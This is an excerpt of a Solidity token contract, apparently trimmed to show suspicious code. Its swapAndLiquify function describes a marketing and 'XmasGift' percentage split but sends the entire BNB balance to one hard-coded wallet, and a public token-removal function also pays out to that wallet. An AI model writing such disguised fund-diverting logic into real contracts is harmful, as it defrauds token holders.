...
contract TestToken is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x351e15ef40f8D44121E6F3630D2A243Fa8110867); 
    address payable public Wallet_XmasGift = payable(0x47b079073327366071f3C223c2Bb6CaC8f32b1a3);
    ...
    uint256 public Percent_XmasGift = 40;
    ...
    constructor () {
        ...
        _owner = 0x3141c9AF7ec2c76F00ba1997f7c5a27B6129a295;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_D = contractTokenBalance * Percent_XmasGift / 100;
            ...
            uint256 split_M = Percent_Marketing * 100 / (Percent_AutoLP + Percent_Marketing + Percent_XmasGift);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = Percent_XmasGift * 100 / (Percent_AutoLP + Percent_Marketing + Percent_XmasGift);
            ...
            sendToWallet(Wallet_XmasGift, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_XmasGift, removeRandom);
